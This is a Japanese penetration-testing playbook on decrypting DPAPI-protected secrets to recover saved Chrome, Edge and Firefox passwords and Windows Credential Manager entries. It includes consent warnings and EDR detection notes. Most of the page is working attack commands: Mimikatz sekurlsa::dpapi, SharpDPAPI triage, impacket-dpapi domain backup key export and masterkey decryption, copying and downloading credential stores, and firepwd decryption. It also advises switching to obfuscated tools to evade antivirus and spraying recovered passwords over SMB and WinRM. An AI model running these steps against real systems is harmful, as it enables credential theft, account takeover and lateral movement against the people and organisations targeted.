# DPAPI / ブラウザ保存パスワード取得

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [ ] 業務停止リスク（サービス・認証）
> - [ ] 持続化に該当
> - [ ] 不可逆な設定変更を含む
> - [x] SIEM/EDR で確実に検知される（LSASS アクセスによるマスターキー取得は Defender for Endpoint が検知。SQLite ファイルへのアクセスは監査ログ対象）
>
> 実施可否は事前合意で明示確認すること。取得情報は暗号化保管・テスト完了後破棄が必須。演習環境（HTB / OSCP 等）では制約なし。

> **スコープ**: ユーザーセッションまたは LSASS ダンプ済み・NT ハッシュ取得済みの状態から → ブラウザ/Credential Manager の平文パスワード復号まで。DPAPI の暗号構造・マスターキー派生ロジックは `../06_Concepts/` 参照（未作成時は §1 の「仕組みと前提」を参照）。

## 着火条件

以下のいずれかの状態：
- 対象ユーザーとして Windows シェルを持っている → §1 オンライン復号
- LSASS ダンプ済み、または対象ユーザーの NT ハッシュ / パスワードが判明している → §2 オフライン復号
- ドメイン管理者相当の権限でドメイン DPAPI バックアップキーが取得できる → §2 オフライン復号

## 環境前提

- 実行環境: ターゲット（Windows シェル内）でファイル取得・ツール実行。テスター端末（Linux）でオフライン解析
- 必要なツール:
  - `SharpDPAPI`（ペネトレ用 Linux ディストリ非搭載・別途転送要）
  - `pypykatz`（ペネトレ用 Linux ディストリ標準搭載）
  - `impacket-dpapi`（`dpapi.py`、ペネトレ用 Linux ディストリ標準搭載）
  - `firepwd` / `firefox_decrypt`（Firefox 用、要インストール）
- オフライン代替: impacket-dpapi は完全オフライン解析が可能（事前にファイルを取得しておけばよい）

## 先に確認すること

**DPAPI の復号パターン選択:**

| 手元の状況 | 使うパターン |
|-----------|------------|
| 対象ユーザーのセッション内 / LSASS にマスターキーがキャッシュ | §1 オンライン復号（SharpDPAPI / Mimikatz） |
| ドメインバックアップキーを取得済み | §2 オフライン復号（impacket-dpapi） |
| 対象ユーザーの NT ハッシュ / パスワードが判明 | §2 オフライン復号（impacket-dpapi） |

**DPAPI の仕組み（復号に必要な知識）:**

- マスターキーの保存場所: `C:\Users\[USER]\AppData\Roaming\Microsoft\Protect\S-1-5-21-[DOMAIN_SID]-[RID]\[MASTERKEY_GUID]`
- マスターキー自体はユーザーのログインパスワードから派生した鍵で暗号化されている
- LSASS はアクティブなセッションのマスターキーをメモリにキャッシュしている

---

## 1. オンライン復号（ユーザーセッション内 / LSASS 経由）

**攻撃者の思考トレース**: LSASS はアクティブな DPAPI マスターキーをメモリにキャッシュしている。`sekurlsa::dpapi` / pypykatz でキャッシュを引き出すことで、マスターキーファイルを復号する手間を省略できる。

**コマンド（方法A — SharpDPAPI で一括取得）:**

> **SharpDPAPI とは:** DPAPI を活用してブラウザ・Credential Manager の暗号化された認証情報を一括復号する .NET ツール（ペネトレ用 Linux ディストリ非搭載・別途転送要）。

**事前準備（必須）:** SharpDPAPI.exe をターゲットに転送しておく。

```powershell
# [Target] 現在のユーザーセッション内でブラウザ保存パスワードを復号
C:\Windows\Temp\SharpDPAPI.exe triage

# SYSTEM 権限がある場合（より広範な情報を取得）
C:\Windows\Temp\SharpDPAPI.exe backupkey /nowrap
# → ドメインバックアップキーを取得（§2 のオフライン復号で利用可）
```

**コマンド（方法B — pypykatz で LSASS ダンプからマスターキーを取得）:**

LSASS ダンプ済みの場合（`./Privilege_Tokens.md` の SeDebug セクション参照）、テスター端末で実行できる。

```bash
# [Attacker] pypykatz で DPAPI マスターキーを抽出
pypykatz lsa minidump lsass.dmp
# 出力の DPAPI セクションから masterkey を控える
```

**コマンド（方法C — Mimikatz でメモリ内マスターキーを取得）:**

> **事前条件:** SeDebugPrivilege が有効な状態（`./Privilege_Tokens.md` の SeDebug セクション参照）

```powershell
# [Target] Mimikatz でマスターキーをメモリから取得
C:\Windows\Temp\mimikatz.exe
# Mimikatz プロンプト内
privilege::debug
sekurlsa::dpapi
# 出力に MasterKey: [HEX_STRING] が出る → §3-§5 で使用
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| SharpDPAPI が URL + ユーザー名 + パスワードを出力 | ブラウザ保存パスワード取得成功 | §6 横展開観点を確認 |
| pypykatz / Mimikatz に `MasterKey: [HEX]` | マスターキー取得成功 | §3 Chrome / §4 Firefox で各ブラウザを復号 |
| SharpDPAPI がブロックされる | AV シグネチャ検知 | 難読化版または Python 実装代替ツールを使う |

---

## 2. オフライン復号（ドメインバックアップキーまたは NT ハッシュを使用）

**攻撃者の思考トレース**: DPAPI マスターキーはユーザーのログインパスワードから派生するため、NT ハッシュさえあれば対象ユーザーがオフラインでも復号できる。ドメインバックアップキー（DA 権限で取得可）を使えばすべてのユーザーの DPAPI データを復号できる。

**コマンド（方法A — ドメインバックアップキーで復号）:**

**事前準備（必須）:** 対象ユーザーのマスターキーファイル（`%APPDATA%\Microsoft\Protect\[SID]\[GUID]`）を取得しておく。

```bash
# [Attacker] ドメインバックアップキーを取得（DA 権限が必要）
impacket-dpapi backupkeys \
  --export \
  -t '[DOMAIN]/[DA_USER]:[PASSWORD]@[DC_IP]'
# カレントディレクトリに ntbackupkey_[GUID].pvk として保存される

# マスターキーファイルをバックアップキーで復号
impacket-dpapi masterkey \
  -file '/path/to/[MASTERKEY_GUID]' \
  -pvk '/path/to/ntbackupkey_[GUID].pvk'
# 出力: Decrypted key: [HEX_MASTERKEY]

# 暗号化された DPAPI Blob を復号
impacket-dpapi credential \
  -file '/path/to/[CREDENTIAL_FILE]' \
  -key '[HEX_MASTERKEY]'
```

**コマンド（方法B — NT ハッシュでマスターキーをオフライン復号）:**

```bash
# [Attacker]
impacket-dpapi masterkey \
  -file '/path/to/[MASTERKEY_GUID]' \
  -sid 'S-1-5-21-[DOMAIN_SID]-[RID]' \
  -hash '[NT_HASH]'
# または平文パスワードがある場合
impacket-dpapi masterkey \
  -file '/path/to/[MASTERKEY_GUID]' \
  -sid 'S-1-5-21-[DOMAIN_SID]-[RID]' \
  -password '[USER_PASSWORD]'
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| `Decrypted key: [HEX_MASTERKEY]` | マスターキー復号成功 | §3 Chrome / §4 Firefox で各ブラウザを復号 |
| 復号に失敗 | SID / NT ハッシュの誤り | ユーザーの SID を `impacket-lookupsid` で再確認 |

---

## 3. Chrome / Edge の保存パスワードを取得

Chrome・Edge は DPAPI で暗号化したパスワードを SQLite データベース（`Login Data`）に保存する。

**ファイルの場所:**

```
Chrome: C:\Users\[USER]\AppData\Local\Google\Chrome\User Data\Default\Login Data
Edge:   C:\Users\[USER]\AppData\Local\Microsoft\Edge\User Data\Default\Login Data
Chrome: C:\Users\[USER]\AppData\Local\Google\Chrome\User Data\Local State  ← AES キー
```

**コマンド（方法A — SharpDPAPI でワンショット取得）:**

```powershell
# [Target]
C:\Windows\Temp\SharpDPAPI.exe triage
# または Chrome 専用の SharpChrome
C:\Windows\Temp\SharpChrome.exe logins
```

**コマンド（方法B — 手動で SQLite から取得してオフライン復号）:**

**事前準備（必須）:** Chrome/Edge が起動中の場合は `Login Data` がロックされているため、コピーしてから操作する。

```powershell
# [Target] Login Data をコピー（ロック回避）
copy "C:\Users\[USER]\AppData\Local\Google\Chrome\User Data\Default\Login Data" C:\Windows\Temp\LoginData_bk
copy "C:\Users\[USER]\AppData\Local\Google\Chrome\User Data\Local State" C:\Windows\Temp\LocalState_bk

download C:\Windows\Temp\LoginData_bk
download C:\Windows\Temp\LocalState_bk
```

```bash
# [Attacker] SQLite から暗号化パスワードを確認
python3 - <<'EOF'
import sqlite3
db = sqlite3.connect('LoginData_bk')
cursor = db.cursor()
cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
for row in cursor.fetchall():
    url, user, enc_pass = row
    print(f"URL: {url}, User: {user}, EncPass(hex): {enc_pass.hex()[:40]}...")
db.close()
EOF
# v10 プレフィックス（"v10"）が付いている場合 → Chrome 80+ の AES-GCM 暗号化
# → Local State の encrypted_key を impacket-dpapi で復号してから AES-GCM で復号する
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| SharpDPAPI / SharpChrome が URL + ユーザー + パスワードを出力 | 取得成功 | §6 横展開観点を確認 |
| `v10` プレフィックス付きの hex | Chrome 80+ の追加暗号化 | Local State の `encrypted_key` を取得して AES-GCM キーを先に復号する |

---

## 4. Firefox の保存パスワードを取得

Firefox は NSS（Network Security Services）でパスワードを保存する（DPAPI は使用しない）。

**ファイルの場所:**

```
C:\Users\[USER]\AppData\Roaming\Mozilla\Firefox\Profiles\[PROFILE_GUID].default-release\
  ├── logins.json   # 暗号化されたパスワードエントリ
  └── key4.db       # 暗号化に使うマスターキー（SQLite 形式）
```

**コマンド:**

```powershell
# [Target] 必要ファイルをダウンロード
download "C:\Users\[USER]\AppData\Roaming\Mozilla\Firefox\Profiles\[PROFILE_GUID].default-release\logins.json"
download "C:\Users\[USER]\AppData\Roaming\Mozilla\Firefox\Profiles\[PROFILE_GUID].default-release\key4.db"
```

```bash
# [Attacker] firepwd で復号（マスターパスワードなしの場合）
pip install firepwd --break-system-packages
python3 -m firepwd -d /path/to/profile/dir/
# 出力例:
# https://example.com:[USER]:[PASSWORD]

# マスターパスワードが設定されている場合
python3 -m firepwd -d /path/to/profile/dir/ -p '[MASTER_PASSWORD]'
# 不明な場合は hashcat でクラック（firepwd がハッシュを出力する）
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| `https://example.com:[USER]:[PASSWORD]` | マスターパスワードなしで復号成功 | §6 横展開観点を確認 |
| 復号失敗（パスワードを要求） | マスターパスワードが設定されている | hashcat でクラックを試みる |

---

## 5. Windows Credential Manager の取得

Credential Manager は Web 認証情報・RDP/SMB/SharePoint 等の認証情報を DPAPI で暗号化して保存する。

**コマンド:**

```powershell
# [Target] 保存されている認証情報を列挙（平文では出ない）
cmdkey /list
# 出力例:
# 対象: Domain:target=TERMSRV/[REMOTE_HOST]
# 種類: ドメイン パスワード
# ユーザー: [DOMAIN]\[USER]
```

```powershell
# [Target] SharpDPAPI で Credential Manager を復号
C:\Windows\Temp\SharpDPAPI.exe credentials /unprotect
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| `TERMSRV/[HOST]` エントリに認証情報 | RDP 認証情報が取得できた | 取得した認証情報でそのホストに RDP 接続を試みる |
| 列挙はできるが復号できない | DPAPI マスターキーが未取得 | §1 または §2 で先にマスターキーを取得する |

---

## 刺さらなかったとき

| 現象 | 原因 | 代替 |
|------|------|------|
| `sekurlsa::dpapi` が空 / マスターキーが出ない | 対象ユーザーがオフライン / LSASS キャッシュ対象外 | §2 オフライン復号パターンに切り替える |
| impacket-dpapi でマスターキー復号が失敗 | SID / パスワードの誤り、またはバックアップキーが異なる | ユーザーの SID を `impacket-lookupsid` で再確認 |
| Chrome の `Login Data` がロックされている | ブラウザが起動中 | `copy` でコピーしてからオフライン解析 |
| Chrome パスワードが `v10` プレフィックスで始まるが復号できない | Local State の `encrypted_key` の復号が必要 | Local State も取得して AES-GCM キーを先に復号する |
| Firefox にマスターパスワードが設定されている | firepwd でパスワードなし復号が失敗 | マスターパスワードのクラックを試みる（hashcat） |
| SharpDPAPI がブロックされる | AV シグネチャ検知 | 難読化版または PowerShell 実装の代替ツール |

---

## 昇格成功後に確認すること（横展開観点）

DPAPI・ブラウザ認証情報の取得に成功したら以下を優先して確認する：

- **ブラウザ保存パスワード（URL + 認証情報）** → VPN ポータル・社内 SaaS・クラウドコンソール・外部 SSH への横展開
- **Credential Manager の RDP/SMB 認証情報** → `TERMSRV/[HOST]` エントリは直接 RDP で使える認証情報
- **SharePoint / Teams / Exchange の認証情報** → 追加の内部情報へのアクセス
- **パスワードの使い回し確認** → 取得した平文パスワードを netexec で SMB / WinRM スプレー

---

### 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。ブラウザ保存パスワードは業務システム・個人情報に直結し、プライバシー影響が最大クラス
- **想定されるSIEM/EDR検知**:
  - LSASS アクセス（マスターキー取得）→ Defender for Endpoint の「LSASS Memory Access」アラート
  - SharpDPAPI / Mimikatz の実行 → AV シグネチャ検知（Event ID 4688）
  - `Login Data` / `key4.db` / `logins.json` へのアクセス → ファイル監査ログ（監査ポリシーが有効な場合）
  - ドメインバックアップキー取得（LSARPC `LsaRetrievePrivateData`）→ Defender for Identity のアラート
  - **Sysmon Event ID 10（ProcessAccess to lsass.exe）**: `sekurlsa::dpapi` / pypykatz による LSASS マスターキー取得時に記録
  - **Sysmon Event ID 11（FileCreate）**: `Login Data` / `key4.db` のコピー操作が記録
  - **EDR アラート名（例）**: Defender for Endpoint「Suspicious access to browser credential store」、CrowdStrike「Credential Access: Browser Stored Credentials」
- **業務影響リスク**: なし（読み取り操作のみ）
- **原状回復必須項目**:
  - ✅ コピーした `Login Data` / `key4.db` / `logins.json` / `LocalState` の一時ファイルを削除
  - ✅ 転送したツールバイナリ（SharpDPAPI / SharpChrome 等）を削除
  - ✅ 取得したパスワード一覧・マスターキー値の暗号化保管 → テスト完了時破棄
  - ✅ ドメインバックアップキーファイル（`.pvk`）の暗号化保管 → テスト完了時破棄
- **取得情報の取扱**: 平文パスワード・マスターキーは最高機密扱い。取得直後に暗号化コンテナへ移動し、アクセスログを記録する
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：LSASS ダンプでマスターキーをメモリから取得 → `./Privilege_Tokens.md`（§3 SeDebug セクション）
- 前：SAM/SYSTEM/SECURITY ダンプでオフライン復号の準備 → `./Privilege_Tokens.md`（§2 SeBackup セクション）・`./Credential_Dumping.md`
- 後：取得した平文パスワードの使い回し確認 → `../02_Initial_Access/Credential_Discovery.md`
- 後：取得した NTLM ハッシュで Pass-The-Hash → `./Credential_Dumping.md`
- 後：取得した RDP 認証情報で横断移動 → `./Enumeration_Checklist.md`（Step 7.5 PSSession）
